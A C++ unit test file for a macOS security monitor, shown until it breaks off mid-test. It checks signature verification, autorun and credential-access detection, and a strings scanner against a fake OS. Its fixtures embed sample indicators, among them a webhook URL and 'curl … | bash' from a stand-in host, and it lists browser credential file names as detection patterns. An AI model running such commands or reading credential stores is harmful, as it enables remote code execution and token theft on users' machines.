// mac_logic_tests.cpp -- the portable core of the Mac app (mac/core.cpp) against a fake operating system. No Mac needed; `make tests` builds and runs it with the host g++.
//   g++ -std=c++17 -Wall -Wextra -Wno-misleading-indentation -Icore -Imac -Ishared tests/mac_logic_tests.cpp mac/core.cpp -pthread -o build/mac_logic_tests
// What this cannot say: whether libproc / codesign / FSEvents / CoreGraphics behave on a real Mac as the fake does (mac/sys_mac.cpp, mac/apple.mm).
#include "core.h"
#include <atomic>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <iterator>
#include <map>
#include <mutex>
#include <thread>
#include <sys/stat.h>
#include <unistd.h>
namespace fs=std::filesystem;
static const size_t NP=std::string::npos;

static int checks=0, fails=0;
#define CHECK(c) do{ checks++; if(!(c)){ fails++; printf("  FAIL line %d: %s\n",__LINE__,#c); } }while(0)
#define CHECKS(a,b) do{ checks++; const std::string A_=(a),B_=(b); if(A_!=B_){ fails++; printf("  FAIL line %d: %s == %s\n    got:  [%s]\n    want: [%s]\n",__LINE__,#a,#b,A_.c_str(),B_.c_str()); } }while(0)

// ---------- a fake operating system ----------
struct Fake: sw::Sys{
  std::mutex m; std::map<int,sw::ProcInfo> procs; std::map<int,std::vector<std::string>> files; std::map<std::string,int> sign; std::map<std::string,std::string> plist; std::vector<std::string> signCalls;
  std::vector<int> pids() override{ std::lock_guard<std::mutex> g(m); std::vector<int> v; for(const auto& kv:procs) v.push_back(kv.first); return v; }
  bool procInfo(int pid,sw::ProcInfo& o) override{ std::lock_guard<std::mutex> g(m); auto it=procs.find(pid); if(it==procs.end()) return false; o=it->second; return true; }
  std::vector<std::string> openFiles(int pid) override{ std::lock_guard<std::mutex> g(m); auto it=files.find(pid); return it==files.end()?std::vector<std::string>():it->second; }
  int codesign(const std::string& p) override{ std::lock_guard<std::mutex> g(m); signCalls.push_back(p); auto it=sign.find(p); return it==sign.end()?1:it->second; }   // anything unlisted is unsigned
  std::string plistProgram(const std::string& p) override{ std::lock_guard<std::mutex> g(m); auto it=plist.find(p); if(it!=plist.end()) return it->second;
    return p.size()>=29&&p.compare(p.size()-29,29,"com.sentinelwatch.agent.plist")==0?sw::g_selfExe:std::string(); }                  // our own LaunchAgent points at us
  bool adhocCopy=true; int adhocVerdict=1;
  bool adhocSignedCopy(const std::string& src,const std::string& dst) override{ std::lock_guard<std::mutex> g(m); if(!adhocCopy) return false;
    { std::ofstream f(dst,std::ios::binary|std::ios::trunc); f<<"copy of "<<src; } sign[dst]=adhocVerdict; return true; }
  double idleSeconds() override{ return 0; }
  bool screenLocked() override{ return false; }
  void add(int pid,const std::string& name,const std::string& path){ std::lock_guard<std::mutex> g(m); procs[pid]={pid,name,path}; }
  void drop(int pid){ std::lock_guard<std::mutex> g(m); procs.erase(pid); }
  size_t calls(){ std::lock_guard<std::mutex> g(m); return signCalls.size(); }
};
static Fake g_fake; static std::string g_root, g_home; static std::atomic<int64_t> g_clock{1000000};
static int64_t fakeNow(){ return g_clock.load(); }
static std::vector<std::string> g_toasts;
static const std::string MACHO("\xCF\xFA\xED\xFE\x0C\x00\x00\x01",8);

static std::string slurp(const std::string& p){ std::ifstream f(p,std::ios::binary); return std::string((std::istreambuf_iterator<char>(f)),std::istreambuf_iterator<char>()); }
static void put(const std::string& p,const std::string& d){ std::error_code ec; fs::create_directories(fs::path(p).parent_path(),ec); std::ofstream f(p,std::ios::binary|std::ios::trunc); f.write(d.data(),(std::streamsize)d.size()); }
static std::string logText(){ return slurp(sw::dataDir()+"/events.log"); }
static int countEv(const char* tag,const std::string& namePart=""){ int n=0; for(const auto& e:sw::eventsCopy()) if(e.tag==tag&&e.name.find(namePart)!=NP) n++; return n; }
static bool hasEv(const char* tag,const std::string& namePart,const std::string& path=""){ for(const auto& e:sw::eventsCopy()) if(e.tag==tag&&e.name.find(namePart)!=NP&&(path.empty()||e.path==path)) return true; return false; }
static bool toasted(const std::string& part){ for(const auto& t:g_toasts) if(t.find(part)!=NP) return true; return false; }
static bool waitIdle(){ for(int i=0;i<1000;i++){ if(sw::stringsScanIdle()) return true; std::this_thread::sleep_for(std::chrono::milliseconds(5)); } return false; }

// a fresh world: new scratch directory (under /tmp or /var/folders, so every path in it counts as a user-writable place), new data folder, empty fake
static void reset(){
  sw::testReset(); if(!g_root.empty()){ std::error_code ec; fs::remove_all(g_root,ec); }
  std::string tmpl=(fs::temp_directory_path()/"swtest.XXXXXX").string(); g_root=mkdtemp(&tmpl[0]); g_home=g_root+"/home"; fs::create_directories(g_home); setenv("HOME",g_home.c_str(),1);
  sw::setDataDir(g_home+"/Library/Application Support/SentinelWatch"); sw::g_fsRoot=g_root+"/fs"; sw::g_selfExe=g_home+"/Applications/SentinelWatch.app/Contents/MacOS/SentinelWatch";
  { std::lock_guard<std::mutex> g(g_fake.m); g_fake.adhocCopy=true; g_fake.adhocVerdict=1; g_fake.procs.clear(); g_fake.files.clear(); g_fake.sign.clear(); g_fake.plist.clear(); g_fake.signCalls.clear(); g_fake.sign["/bin/ls"]=0; }
  sw::g_sys=&g_fake; g_clock+=100000; sw::g_nowMs=fakeNow; g_toasts.clear();
  sw::g_toastHook=[](const std::string& a,const std::string& b,bool,bool){ g_toasts.push_back(a+"|"+b); };
  sw::g_tStrings=false; }                                           // the strings-scan thread has its own test

// ---------- a strict little JSON checker (the dashboard gets the state as JSON, so it must be valid) ----------
static void ws(const std::string& s,size_t& i){ while(i<s.size()&&(s[i]==' '||s[i]=='\n'||s[i]=='\t'||s[i]=='\r')) i++; }
static bool jStr(const std::string& s,size_t& i){
  if(s[i]!='"') return false; i++;
  while(i<s.size()){ const unsigned char c=(unsigned char)s[i];
    if(c=='"'){ i++; return true; } if(c<0x20) return false;
    if(c=='\\'){ i++; if(i>=s.size()) return false; const char e=s[i];
      if(e&&strchr("\"\\/bfnrt",e)) i++;
      else if(e=='u'){ if(i+4>=s.size()) return false; for(int k=1;k<=4;k++) if(!isxdigit((unsigned char)s[i+k])) return false; i+=5; }
      else return false; }
    else i++; }
  return false; }
static bool jVal(const std::string& s,size_t& i,int depth){
  ws(s,i); if(i>=s.size()||depth>20) return false; const char c=s[i];
  if(c=='{'){ i++; ws(s,i); if(s[i]=='}'){ i++; return true; }
    for(;;){ ws(s,i); if(!jStr(s,i)) return false; ws(s,i); if(s[i]!=':') return false; i++; if(!jVal(s,i,depth+1)) return false; ws(s,i); if(s[i]==','){ i++; continue; } if(s[i]=='}'){ i++; return true; } return false; } }
  if(c=='['){ i++; ws(s,i); if(s[i]==']'){ i++; return true; }
    for(;;){ if(!jVal(s,i,depth+1)) return false; ws(s,i); if(s[i]==','){ i++; continue; } if(s[i]==']'){ i++; return true; } return false; } }
  if(c=='"') return jStr(s,i);
  for(const char* w:{"true","false","null"}) if(s.compare(i,strlen(w),w)==0){ i+=strlen(w); return true; }
  const size_t st=i; if(s[i]=='-') i++; while(i<s.size()&&isdigit((unsigned char)s[i])) i++; return i>st&&(i>st+1||s[st]!='-'); }
static bool validJson(const std::string& s){ size_t i=0; if(!jVal(s,i,0)) return false; ws(s,i); return i==s.size(); }

// ---------- tests ----------
static void t_text(){
  reset();
  CHECKS(sw::utf8Clean("ok\xFF\xFE" "x"),"ok\xEF\xBF\xBD\xEF\xBF\xBD" "x");
  CHECKS(sw::utf8Clean("\xC0\x80"),"\xEF\xBF\xBD\xEF\xBF\xBD");                         // overlong NUL
  CHECKS(sw::utf8Clean("\xED\xA0\x80"),"\xEF\xBF\xBD\xEF\xBF\xBD\xEF\xBF\xBD");         // a surrogate
  CHECKS(sw::utf8Clean("\xE2\x82"),"\xEF\xBF\xBD\xEF\xBF\xBD");                         // cut short
  CHECKS(sw::utf8Clean("\xF4\x90\x80\x80"),"\xEF\xBF\xBD\xEF\xBF\xBD\xEF\xBF\xBD\xEF\xBF\xBD");   // beyond U+10FFFF
  CHECKS(sw::utf8Clean("\xF0\x9F\x98\x80 \xC3\xA9"),"\xF0\x9F\x98\x80 \xC3\xA9");       // an emoji and an e-acute stay
  CHECKS(sw::jsonStr("a\"b\\c\n\t\x01"),"\"a\\\"b\\\\c\\n\\t\\u0001\"");
  CHECKS(sw::jsonStr("x\xE2\x80\xA8" "y"),"\"x\\u2028y\"");                              // U+2028 ends a JavaScript string literal
  CHECKS(sw::jsonStr("a\xFF"),"\"a\xEF\xBF\xBD\"");
  CHECK(validJson("{\"a\":[1,-2,{\"b\":null}],\"c\":\"d\\u00e9\",\"e\":true}"));
  CHECK(!validJson("{\"a\":}")); CHECK(!validJson("{\"a\":\"x\ny\"}")); CHECK(!validJson("[1,2,]")); CHECK(!validJson("{} x"));
}

static void t_trust(){
  reset();
  CHECK(sw::userWritable("/Users/u/Downloads/a")); CHECK(sw::userWritable("/Users/u/Library/Application Support/Foo/bar")); CHECK(sw::userWritable("/private/tmp/x"));
  CHECK(sw::userWritable("/private/var/folders/ab/cd/T/x")); CHECK(sw::userWritable("/Users/u/Library/LaunchAgents/a.plist"));
  CHECK(!sw::userWritable("/Applications/Foo.app/Contents/MacOS/Foo")); CHECK(!sw::userWritable("/usr/bin/ls")); CHECK(!sw::userWritable(""));
  CHECK(sw::isSystemProc("/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder")); CHECK(sw::isSystemProc("/usr/libexec/xpcd")); CHECK(sw::isSystemProc("/sbin/launchd"));
  CHECK(!sw::isSystemProc("/Users/u/Downloads/x")); CHECK(!sw::isSystemProc("/Applications/X.app/Contents/MacOS/X")); CHECK(!sw::isSystemProc(""));
  CHECK(sw::isExecExt("/x/a.sh")); CHECK(sw::isExecExt("/x/A.APP")); CHECK(sw::isExecExt("/x/a.command")); CHECK(sw::isExecExt("/x/a.scpt")); CHECK(!sw::isExecExt("/x/a.txt")); CHECK(!sw::isExecExt("/x/readme"));
  CHECK(sw::isExecExt("/Users/u/Library/LaunchAgents/com.a.plist")); CHECK(sw::isExecExt("/Library/LaunchDaemons/x.plist")); CHECK(!sw::isExecExt("/Users/u/Documents/a.plist"));
  CHECKS(sw::signTarget("/Users/u/Downloads/Foo.app/Contents/MacOS/Foo"),"/Users/u/Downloads/Foo.app");
  CHECKS(sw::signTarget("/x/Foo.App/Contents/y"),"/x/Foo.App"); CHECKS(sw::signTarget("/x/Foo.app"),"/x/Foo.app"); CHECKS(sw::signTarget("/Users/u/Downloads/tool"),"/Users/u/Downloads/tool");
  CHECKS(sw::signTarget("/x/A.app/Contents/Frameworks/B.app/Contents/MacOS/B"),"/x/A.app");   // the outer bundle is what is signed
  for(const char* n:{"/x/Login Data","/x/Cookies","/x/000003.ldb","/x/key4.db","/x/Local Storage/leveldb/CURRENT"}) CHECK(sw::isCredArtifactName(n));
  CHECK(!sw::isCredArtifactName("/x/readme.txt")); CHECK(!sw::isCredArtifactName("/x/report.pdf"));
  CHECK(sw::isStagingDir("/Users/u/Downloads/x")); CHECK(sw::isStagingDir("/private/tmp/x")); CHECK(sw::isStagingDir("/Users/u/Desktop/x"));
  CHECK(!sw::isStagingDir("/Users/u/Documents/x")); CHECK(!sw::isStagingDir("/Users/u/Library/Application Support/x"));
  // the main program of a bundle: the one named like the bundle, else the first by name, else none
  put(g_root+"/A.app/Contents/MacOS/Other","x"); put(g_root+"/A.app/Contents/MacOS/A","x"); CHECKS(sw::mainExeOf(g_root+"/A.app"),g_root+"/A.app/Contents/MacOS/A");
  put(g_root+"/B.app/Contents/MacOS/zzz","x"); put(g_root+"/B.app/Contents/MacOS/aaa","x"); CHECKS(sw::mainExeOf(g_root+"/B.app"),g_root+"/B.app/Contents/MacOS/aaa");
  fs::create_directories(g_root+"/C.app/Contents"); CHECKS(sw::mainExeOf(g_root+"/C.app"),""); CHECKS(sw::mainExeOf(g_root+"/missing.app"),"");
  put(g_root+"/p1",MACHO+"abc"); put(g_root+"/p2","#!/bin/sh\necho hi\n"); put(g_root+"/p3","hello world, not a program"); put(g_root+"/p4","");
  CHECK(sw::looksLikeProgram(g_root+"/p1")); CHECK(sw::looksLikeProgram(g_root+"/p2")); CHECK(!sw::looksLikeProgram(g_root+"/p3")); CHECK(!sw::looksLikeProgram(g_root+"/p4")); CHECK(!sw::looksLikeProgram(g_root+"/missing"));
}

static void t_sign(){
  reset();
  const std::string F=g_home+"/Downloads/tool1", U=g_home+"/Downloads/tool2", K=g_home+"/Downloads/tool3";
  put(F,"x1"); put(U,"u1"); put(K,"k1"); g_fake.sign[F]=0; g_fake.sign[K]=-1;
  CHECK(sw::isSigned(F)); CHECK(g_fake.calls()==1); CHECK(sw::isSigned(F)); CHECK(g_fake.calls()==1);               // a signed program is asked about once ...
  put(F,"x1y2"); CHECK(sw::isSigned(F)); CHECK(g_fake.calls()==2);                                                   // ... until the file changes
  CHECK(!sw::isSigned(U)); CHECK(g_fake.calls()==3); CHECK(!sw::isSigned(U)); CHECK(g_fake.calls()==3);              // an unsigned verdict is kept too (a spawn per 4 s would add up)
  CHECK(sw::isSigned(K)); CHECK(g_fake.calls()==4); CHECK(sw::isSigned(K)); CHECK(g_fake.calls()==5);                // "could not check" counts as signed, is not kept, and is logged once
  size_t first=logText().find("[SIGN] could not check"); CHECK(first!=NP&&logText().find("[SIGN] could not check",first+1)==NP);
  CHECK(!sw::isSigned(g_root+"/no/such/file")); CHECK(!sw::isSigned(""));
  put(g_home+"/Downloads/B.app/Contents/Info.plist","x"); put(g_home+"/Downloads/B.app/Contents/MacOS/B","x");
  const size_t n=g_fake.calls(); CHECK(!sw::isSigned(g_home+"/Downloads/B.app/Contents/MacOS/B")); CHECK(g_fake.calls()==n+1); CHECKS(g_fake.signCalls.back(),g_home+"/Downloads/B.app");   // a bundle is judged as a whole
  CHECK(sw::suspiciousExe(U)); CHECK(!sw::suspiciousExe(F));
  const size_t m=g_fake.calls(); CHECK(!sw::suspiciousExe("/Applications/Foo.app/Contents/MacOS/Foo")); CHECK(g_fake.calls()==m); CHECK(!sw::suspiciousExe(""));   // not a user folder: codesign is not even asked
  // the self-test: codesign must call an Apple program signed and a plain file not signed, or "unsigned" would mean nothing
  reset(); sw::signSelfTest(); CHECK(sw::g_signUsable); CHECK(logText().find("signature check works")!=NP); CHECK(countEv("SYS")==0);
  reset(); g_fake.sign["/bin/ls"]=1; sw::signSelfTest(); CHECK(!sw::g_signUsable); CHECK(hasEv("SYS","signature check unavailable")); CHECK(!sw::suspiciousExe(g_home+"/Downloads/whatever"));
  reset(); g_fake.sign["/bin/ls"]=-1; sw::signSelfTest(); CHECK(!sw::g_signUsable);
  reset(); g_fake.sign[sw::dataDir()+"/signcheck.txt"]=0; sw::signSelfTest(); CHECK(!sw::g_signUsable);                // a check that passes a text file is not checking anything
  CHECK(!fs::exists(sw::dataDir()+"/signcheck.txt")); CHECK(!fs::exists(sw::dataDir()+"/signcheck.bin"));
  reset(); g_fake.adhocVerdict=0; sw::signSelfTest(); CHECK(!sw::g_signUsable); CHECK(logText().find("an ad-hoc signed copy gave 0")!=NP);   // "Apple-anchored" is not being tested: ad-hoc passes
  reset(); g_fake.adhocCopy=false; sw::signSelfTest(); CHECK(sw::g_signUsable); CHECK(logText().find("could not be made")!=NP);       // no control possible: the other two decide
  reset(); g_fake.adhocVerdict=-1; sw::signSelfTest(); CHECK(!sw::g_signUsable);
}

static void t_settings(){
  sw::testReset(); CHECK(sw::g_tStrings&&sw::g_tAutostart&&sw::g_tTokens&&sw::g_tAutorun&&!sw::g_tAllFiles); CHECK(std::string(sw::g_toggles[9].key)=="autostart");   // the defaults
  reset();
  sw::g_tStrings=true; sw::g_tAllFiles=true; sw::g_tBeep=false; sw::g_afkIdleSec=30; sw::g_dashW=1200; sw::g_dashH=700; sw::saveSettings();
  const std::string P=sw::dataDir()+"/settings.json", j=slurp(P);
  CHECK(validJson(j)); CHECK(j.find("\"allfiles\": true")!=NP); CHECK(j.find("\"beep\": false")!=NP); CHECK(j.find("\"afkIdleSec\": 30")!=NP); CHECK(!fs::exists(P+".tmp"));
  sw::testReset(); sw::loadSettings(); CHECK(sw::g_tAllFiles); CHECK(!sw::g_tBeep); CHECK(sw::g_tStrings); CHECK(sw::g_afkIdleSec==30); CHECK(sw::g_dashW==1200&&sw::g_dashH==700);
  put(P,"{\"afkIdleSec\": 3, \"dashW\": 100, \"dashH\": 99999, \"strings\": false, \"autostart\" : false}");           // too small is raised to 5; sizes out of range are ignored
  sw::testReset(); sw::loadSettings(); CHECK(sw::g_afkIdleSec==5); CHECK(sw::g_dashW==sw::DASH_W&&sw::g_dashH==sw::DASH_H); CHECK(!sw::g_tStrings); CHECK(!sw::g_tAutostart); CHECK(sw::g_tTokens);
  put(P,"{\"afkIdleSec\": 5000}"); sw::testReset(); sw::loadSettings(); CHECK(sw::g_afkIdleSec==0);
  put(P,"garbage"); sw::testReset(); sw::loadSettings(); CHECK(sw::g_tStrings&&sw::g_tAutostart&&sw::g_afkIdleSec==0);
  fs::remove(P); sw::loadSettings(); CHECK(sw::g_tStrings);                                                           // no file: nothing happens
}

static void t_events(){
  reset();
  for(int i=0;i<100;i++) sw::pushEvRaw("PROC","p"+std::to_string(i),"/x/"+std::to_string(i));
  auto e=sw::eventsCopy(); CHECK(e.size()==80); CHECKS(e.front().name,"p99"); CHECKS(e.back().name,"p20");              // the newest 80, newest first
  reset(); const unsigned r0=sw::g_rev.load();
  for(int i=0;i<40;i++) sw::pushEv("FILE","f"+std::to_string(i),"/y");
  CHECK(sw::eventsCopy().size()==30); CHECK(sw::g_rev.load()>r0);                                                       // the storm guard: 30 a second
  g_clock+=1000; for(int i=0;i<40;i++) sw::pushEv("FILE","g"+std::to_string(i),"/y"); CHECK(sw::eventsCopy().size()==60);
  CHECK(logText().find("FILE f0 | /y")!=NP); CHECK(logText().find("FILE f39 | /y")==NP); CHECK(logText().find("FILE g29 | /y")!=NP);
  CHECK(sw::cmdRevealOk("/y")); CHECK(!sw::cmdRevealOk("/etc/passwd"));
  sw::logLine(std::string("bad \xFF byte")); CHECK(logText().find("bad \xEF\xBF\xBD byte")!=NP);                      // the log stays valid UTF-8
  const std::string L=sw::dataDir()+"/events.log"; put(L,std::string(4*1024*1024+10,'x')); sw::logRotate(); CHECK(fs::exists(sw::dataDir()+"/events.old.log")); CHECK(!fs::exists(L));
}

static void t_procs(){
  reset();
  const std::string drop=g_home+"/Downloads/dropper";
  g_fake.add(1,"dropper",drop); g_fake.add(2,"Safari","/Applications/Safari.app/Contents/MacOS/Safari"); g_fake.add(3,"ls","/bin/ls"); g_fake.add(4,"ls","/usr/bin/ls");
  g_fake.add((int)getpid(),"me",g_home+"/Downloads/me"); g_fake.add(11,"","");
  sw::procScan();
  CHECK(hasEv("WARN","dropper",drop)); CHECK(hasEv("PROC","Safari")); CHECK(countEv("PROC","ls")==1); CHECK(hasEv("PROC","me"));                // our own process is never flagged
  CHECK(hasEv("PROC","(pid 11)","(running)")); CHECK(sw::g_procCount==6);
  const size_t before=sw::eventsCopy().size(); sw::procTick(); CHECK(sw::eventsCopy().size()==before);                                          // nothing new
  g_fake.add(6,"evil","/private/tmp/x/evil"); sw::procTick(); CHECK(hasEv("WARN","evil","/private/tmp/x/evil")); CHECK(toasted("Unsigned app")); CHECK(sw::g_procCount==7);
  g_fake.add(7,"Finder","/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder"); sw::procTick(); CHECK(countEv("PROC","Finder")==0); CHECK(sw::g_procCount==7);   // Apple system processes are skipped
  sw::g_tIgnoreSys=false; g_fake.add(8,"xpcd","/usr/libexec/xpcd"); sw::procTick(); CHECK(hasEv("PROC","xpcd"));
  g_fake.drop(6); sw::procTick(); const int w=countEv("WARN","evil"); g_fake.add(6,"evil","/private/tmp/x/evil"); sw::procTick(); CHECK(countEv("WARN","evil")==w+1);   // gone, then started again: new again
  sw::g_tProc=false; g_fake.add(9,"later","/Applications/X.app/Contents/MacOS/x"); sw::procTick(); CHECK(countEv("PROC","later")==0);
  sw::g_tProc=true; sw::procTick(); CHECK(countEv("PROC","later")==0);                                                                          // started while the switch was off: not reported afterwards either
  g_fake.add(12,"","/Applications/Y.app/Contents/MacOS/y"); sw::procTick(); CHECK(hasEv("PROC","y"));                                          // no name: the path's last part
  g_clock+=2000; reset(); g_fake.add(1,"a","/Applications/a"); g_fake.add(2,"b","/Applications/b"); sw::g_tStrings=false; sw::procScan(); sw::g_tIgnoreSys=true; sw::procTick(); CHECK(sw::g_procCount==2);
}

static void t_autoruns(){
  reset();
  const std::string la=g_home+"/Library/LaunchAgents", sa=g_root+"/fs/Library/LaunchAgents", sd=g_root+"/fs/Library/LaunchDaemons", own="com.sentinelwatch.agent.plist";
  put(la+"/com.a.plist","x"); put(la+"/readme.txt","x"); put(la+"/"+own,"x"); put(sd+"/com.d.plist","x"); put(sa+"/"+own,"x");
  g_fake.plist[la+"/com.a.plist"]="/tmp/a"; g_fake.plist[sd+"/com.d.plist"]="/usr/local/bin/d"; g_fake.plist[sa+"/"+own]="/tmp/evil";
  auto s=sw::scanAutoruns();
  CHECK(s.size()==3); CHECK(s.count("PLIST LaunchAgents | com.a.plist = /tmp/a")); CHECK(s.count("PLIST LaunchDaemons | com.d.plist = /usr/local/bin/d"));
  CHECK(s.count("PLIST LaunchAgents* | "+own+" = /tmp/evil"));                                                         // ours is skipped; the same name pointing elsewhere is an impostor and is reported
  sw::appInit(g_root+"/bundle",false);                                                                                  // writes the baseline (and our own LaunchAgent, which must not count)
  CHECK(sw::g_known.size()==3); CHECK(slurp(sw::dataDir()+"/baseline.txt").find("com.a.plist")!=NP); CHECK(logText().find("starting on")!=NP);
  sw::doScan(true); CHECK(countEv("WARN","new autorun")==0); CHECK(hasEv("SYS","manual scan"));
  put(la+"/com.new.plist","x"); g_fake.plist[la+"/com.new.plist"]="/tmp/new"; g_toasts.clear(); sw::doScan(true);
  CHECK(hasEv("WARN","new autorun","PLIST LaunchAgents | com.new.plist = /tmp/new")); CHECK(toasted("New login item")); CHECK(slurp(sw::dataDir()+"/baseline.txt").find("com.new.plist")!=NP); CHECK(sw::g_known.size()==4);
  sw::doScan(true); CHECK(countEv("WARN","new autorun")==1);                                                            // reported once
  put(la+"/com.new2.plist","x"); g_toasts.clear(); sw::doScan(false); CHECK(countEv("WARN","new autorun")==2); CHECK(g_toasts.empty());   // the 5-minute scan reports without a toast
  sw::g_tAutorun=false; sw::doScan(false); CHECK(hasEv("SYS","scan skipped")); sw::g_tAutorun=true;
  put(la+"/com.while-off.plist","x"); sw::g_known.clear(); sw::loadSettings();                                         // a new start: the baseline comes from the file
  sw::appInit(g_root+"/bundle",true); CHECK(sw::g_known.size()==5); CHECK(logText().find("(hidden in the menu bar)")!=NP);
  sw::doScan(false); CHECK(countEv("WARN","new autorun")==3); CHECK(hasEv("WARN","new autorun","PLIST LaunchAgents | com.while-off.plist"));   // added while the app was off: reported at once
}

static void t_token(){
  reset();
  const std::string chrome=g_home+"/Library/Application Support/Google/Chrome/Default/Login Data", kc=g_home+"/Library/Keychains/login.keychain-db";
  g_fake.add(10,"stealer","/private/tmp/sw/stealer"); g_fake.files[10]={"/etc/hosts",chrome};
  g_fake.add(11,"goodtool","/private/tmp/sw/goodtool"); g_fake.sign["/private/tmp/sw/goodtool"]=0; g_fake.files[11]={chrome};      // signed: not even asked
  g_fake.add(12,"other","/private/tmp/sw/other"); g_fake.files[12]={"/etc/hosts",g_home+"/Documents/a.txt"};
  g_fake.add((int)getpid(),"me",g_home+"/Downloads/me"); g_fake.files[(int)getpid()]={chrome};
  sw::procScan(); const size_t t0=sw::eventsCopy().size(); (void)t0;
  sw::tokenGuardTick();
  CHECK(countEv("WARN","token access")==1); CHECK(hasEv("WARN","token access (Chrome): stealer","/private/tmp/sw/stealer")); CHECK(sw::g_tokenAlerts==1); CHECK(toasted("Credential/token access"));
  sw::tokenGuardTick(); CHECK(countEv("WARN","token access")==1);                                                      // once per process
  g_fake.drop(10); sw::procTick(); sw::tokenGuardTick(); g_fake.add(10,"stealer","/private/tmp/sw/stealer"); sw::procTick(); sw::tokenGuardTick(); CHECK(countEv("WARN","token access")==2);   // gone and back: again
  g_fake.add(13,"kc","/private/tmp/sw/kc"); g_fake.files[13]={kc}; sw::procTick(); sw::tokenGuardTick(); CHECK(hasEv("WARN","token access (Keychain): kc"));
  sw::g_tTokens=false; g_fake.add(14,"kc2","/private/tmp/sw/kc2"); g_fake.files[14]={kc}; sw::procTick(); sw::tokenGuardTick(); CHECK(countEv("WARN","token access (Keychain): kc2")==0);
}

static void t_files(){
  reset(); const std::string D=g_home+"/Downloads/";
  auto settle=[]{ g_clock+=1600; sw::fileTick(); };
  put(D+"dropper",MACHO+"x"); sw::fileEvent(D+"dropper"); sw::fileTick(); CHECK(countEv("WARN")==0);                    // too early: a program is still being written
  settle(); CHECK(hasEv("WARN","dropper",D+"dropper")); CHECK(toasted("New unsigned executable")); CHECK(sw::g_fileCount==1);
  put(D+"good",MACHO+"x"); g_fake.sign[D+"good"]=0; sw::fileEvent(D+"good"); settle(); CHECK(hasEv("FILE","good")); CHECK(countEv("WARN","good")==0);   // signed: noted, not warned
  put(D+"notes.txt","hello"); sw::fileEvent(D+"notes.txt"); settle(); CHECK(countEv("FILE","notes.txt")==0);
  sw::g_tAllFiles=true; put(D+"notes2.txt","hello"); sw::fileEvent(D+"notes2.txt"); settle(); CHECK(hasEv("FILE","notes2.txt")); sw::g_tAllFiles=false;
  put(D+"run.sh","#!/bin/sh\n"); sw::fileEvent(D+"run.sh"); settle(); CHECK(hasEv("WARN","run.sh"));
  put(D+"Evil.app/Contents/Info.plist","x"); put(D+"Evil.app/Contents/MacOS/Evil",MACHO+"x"); g_fake.signCalls.clear();
  for(const char* p:{"Evil.app","Evil.app/Contents","Evil.app/Contents/MacOS","Evil.app/Contents/MacOS/Evil","Evil.app/Contents/Info.plist"}) sw::fileEvent(D+p);
  settle(); CHECK(countEv("WARN","Evil")==1); CHECK(hasEv("WARN","Evil.app",D+"Evil.app")); CHECK(countEv("FILE","Evil")==0);                // one item for the whole bundle (not one per file inside it)
  bool root=false; for(const auto& c:g_fake.signCalls) if(c==D+"Evil.app") root=true; CHECK(root);
  put(D+"Login Data","SQLite format 3"); sw::fileEvent(D+"Login Data"); settle(); CHECK(hasEv("WARN","token file staged: Login Data")); CHECK(sw::g_tokenAlerts==1); CHECK(toasted("Credential file copied"));
  const std::string chrome=g_home+"/Library/Application Support/Google/Chrome/Default/Login Data"; put(chrome,"SQLite format 3"); const int w=countEv("WARN"); sw::fileEvent(chrome); settle();
  if(sw::isStagingDir(chrome)) printf("  (skipped: this host's temp folder is itself a staging folder; run with TMPDIR=<dir>/Users/Shared/x to include the check)\n");
  else CHECK(countEv("WARN")==w);                                                                                        // the browser's own file is not a copy
  put(g_home+"/Library/Caches/foo/bin",MACHO+"x"); sw::fileEvent(g_home+"/Library/Caches/foo/bin"); settle(); CHECK(countEv("WARN","bin")==0&&countEv("FILE","bin")==0);   // caches are noise ...
  put(g_home+"/Library/Caches/foo/x.sh","#!/bin/sh\n"); sw::fileEvent(g_home+"/Library/Caches/foo/x.sh"); settle(); CHECK(hasEv("WARN","x.sh"));                                  // ... unless it is a script
  sw::fileEvent(D+"ghost"); settle(); CHECK(countEv("FILE","ghost")==0&&countEv("WARN","ghost")==0);                    // vanished before the look
  put(g_home+"/Library/LaunchAgents/com.evil.plist","x"); sw::fileEvent(g_home+"/Library/LaunchAgents/com.evil.plist"); settle(); CHECK(hasEv("WARN","com.evil.plist"));   // a new launchd job
  const int n=(int)sw::eventsCopy().size(); sw::fileEvent(sw::dataDir()+"/events.log"); sw::fileEvent(g_home+"/Library/LaunchAgents/com.sentinelwatch.agent.plist"); settle(); CHECK((int)sw::eventsCopy().size()==n);   // our own files
  sw::g_tFile=false; put(D+"off",MACHO+"x"); sw::fileEvent(D+"off"); settle(); CHECK(countEv("WARN","off")==0); sw::g_tFile=true;
  fs::create_directories(D+"plainfolder"); sw::fileEvent(D+"plainfolder"); settle(); CHECK(countEv("WARN","plainfolder")==0&&countEv("FILE","plainfolder")==0);
  std::error_code ec; fs::create_symlink(D+"dropper",D+"link",ec); sw::fileEvent(D+"link"); settle(); CHECK(countEv("WARN","link")==0&&countEv("FILE","link")==0);   // links are not followed
}

static void t_strings(){
  reset(); sw::g_tStrings=true; sw::g_waitStableMs=0;
  const std::string f=g_home+"/Downloads/mal"; std::string d=MACHO; d+='\0'; d+="__TEXT"; d+='\0'; d+="https://discord.com/api/webhooks/1/abc"; d+='\0'; d+="http://evil.example.com/p.bin"; d+='\0'; put(f,d);
  sw::stringsScanAsync(f); CHECK(waitIdle());
  CHECK(hasEv("STR","strings: 2 link(s), 0 command(s)",f)); CHECK(logText().find("[STR]   [!] https://discord.com/api/webhooks/1/abc")!=NP); CHECK(toasted("Links / commands inside it|mal\n[!] https://discord.com"));
  sw::stringsScanAsync(f); CHECK(waitIdle()); CHECK(countEv("STR")==1);                                                   // the same version is not read twice
  d+="curl -fsSL http://x.example.org/i.sh | bash"; d+='\0'; put(f,d); sw::stringsScanAsync(f); CHECK(waitIdle()); CHECK(countEv("STR")==2);   // a changed file is
  const std::string clean=g_home+"/Downloads/clean"; put(clean,MACHO+"hello world, nothing to see"); sw::stringsScanAsync(clean); CHECK(waitIdle()); CHECK(countEv("STR")==2); CHECK(logText().find("clean: no links")!=NP);
  put(sw::g_selfExe,d); sw::stringsScanAsync(sw::g_selfExe); sw::stringsScanAsync("(running)"); sw::stringsScanAsync(sw::dataDir()+"/x"); sw::stringsScanAsync(""); sw::stringsScanAsync(g_home+"/Downloads/missing"); CHECK(waitIdle()); CHECK(countEv("STR")==2);
